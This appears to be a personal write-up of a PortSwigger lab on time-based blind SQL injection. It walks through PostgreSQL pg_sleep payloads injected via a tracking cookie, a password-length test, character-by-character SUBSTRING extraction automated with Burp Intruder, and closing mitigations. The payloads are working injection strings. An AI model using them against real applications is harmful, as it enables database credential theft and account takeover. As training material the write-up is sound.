# Blind SQL injection with time delays and information retrieval

**Source:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)  
**Category:** SQL Injection  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, log in as the `administrator` user.

## Vulnerability
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

## Exploitation

### Steps

1. Intercepted the HTTP request and identified the `TrackingId` cookie parameter as the injection point. Sent the request to Burp Repeater for testing.

2. Tested time delay payloads for different database engines because the database type was unknown.

    - Oracle:
        `TrackingId=RnsZLAApzzXHKsn0'||dbms_pipe.receive_message(('a'),10)--`
        No noticeable delay was observed, indicating that the database was not Oracle.
    - PostgreSQL:
        `TrackingId=RnsZLAApzzXHKsn0'||(SELECT pg_sleep(10))--`
        The response was delayed by approximately 10 seconds, confirming that the database uses PostgreSQL.

3. Verified that conditional time delays can be used to extract information from the database.

Tested the administrator password length using:
```http
TrackingId=RnsZLAApzzXHKsn0'||(SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))=20) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

A delay of approximately 10 seconds was returned, confirming that the administrator password length is 20 characters.

4. Prepared a payload to extract the password character by character using `SUBSTRING()` and conditional delays.

Example for the first character:
```sql
'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```
The condition causing a 10 second delay indicated that the tested character was correct.

5. Configured Burp Intruder to automate password extraction.
    - Used the **Cluster Bomb** attack type.
    - Created two payload positions:
        - First position: password character index (`1-20`).
        - Second position: possible characters (`a-z` and `0-9`).

    ```http
    TrackingId=RnsZLAApzzXHKsn0'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
    ```

    Correct values were identified by analyzing the **Response received** time in Intruder results.
    - Normal responses returned in a few hundred milliseconds.
    - Correct character matches returned after approximately 10 seconds.

6. Reconstructed the administrator password by matching each character position with the character that caused the time delay. Finall password `administrator:mjpv9ux3glwmwjkksavw`

7. Used the extracted password to log in as the administrator user.

### Payload

Database identification (PostgreSQL):
```http
TrackingId=RnsZLAApzzXHKsn0'||(SELECT pg_sleep(10))--
```

Password length extraction:
```http
TrackingId=RnsZLAApzzXHKsn0'||(SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))=20) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

Password character extraction:
```http
TrackingId=RnsZLAApzzXHKsn0'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```

### Shortcut
1. Confirm the database supports time-based delays:
```http
TrackingId=...'||(SELECT pg_sleep(10))--
```
2. Determine the administrator password length using a conditional delay.
3. Extract the password character by character with `SUBSTRING()` and `pg_sleep()`, automating the process with Burp Intruder.
```http
TrackingId=...'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```
4. Log in as `administrator` using the extracted password.


## Impact
Blind SQL injection allows attackers to extract sensitive database information even when query results are not directly returned by the application. Using time-based techniques, an attacker can retrieve credentials and potentially compromise user accounts.

## Mitigation

Use parameterized queries (prepared statements) to prevent user input from being interpreted as SQL syntax.

Additional protections:
- Validate and sanitize user input.
- Use least privilege database accounts.
- Avoid exposing unnecessary database functionality.
- Monitor unusual query behavior and suspicious response timing patterns.

## Tools
- Burp Suite
- Repeater
- Intruder

## Notes

This lab demonstrates time-based blind SQL injection. When the application does not return query results or database errors, an attacker can use conditional delays as a boolean oracle.

The first step is identifying the database engine because time delay functions differ between DBMS implementations. After identifying PostgreSQL, the password was extracted character by character using conditional `pg_sleep()` delays and automated with Burp Intruder Cluster Bomb.